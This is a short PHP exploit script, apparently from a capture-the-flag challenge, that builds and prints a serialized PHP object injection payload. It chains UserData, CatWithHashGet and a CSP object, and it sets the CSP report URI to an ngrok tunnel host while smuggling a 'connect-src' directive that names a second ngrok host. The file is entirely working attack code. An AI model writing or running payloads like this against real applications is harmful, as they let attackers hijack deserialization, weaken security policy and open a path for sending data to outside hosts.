<?php

require_once "index.php";
require_once "framework/CSP.module";

# PHP Object Injection
$user = new UserData();
$user->token_name = "Gotua Pwn!!!";
$user->pwn_obj = new CatWithHashGet();
$user->pwn_obj->user_object = new UserData();
$user->pwn_obj->csp_object = new ShouFramework\CSP();
$user->pwn_obj->csp_object->report_uri_string = "http://bb9e-140-113-194-71.ngrok.io/module/csp/report_csp ; connect-src 68e6-140-113-194-71.ngrok.io";

echo serialize($user);

echo "\n\n\n\n";